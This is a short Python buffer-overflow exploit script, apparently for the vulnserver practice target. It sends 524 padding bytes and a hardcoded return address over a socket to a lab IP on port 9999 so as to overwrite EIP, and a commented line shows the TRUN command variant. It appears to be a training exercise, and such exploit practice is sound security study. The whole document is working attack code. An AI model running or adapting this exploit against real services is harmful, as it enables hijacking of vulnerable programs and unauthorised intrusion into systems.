#!/usr/bin/python
import sys
import socket

# return address => 311712F3
# use mona module to get returnaddress
return_address = "\xF3\x12\x17\x31"

offset = 524  # replace it with your offset genereted by msf-pattern_offset
shellcode = "A" * offset + return_address

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.10.12', 9999))
    s.send((shellcode))
    #s.send(('TRUN /.:/' + shellcode))
    print("Yey! we are controlling the EIP ")
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
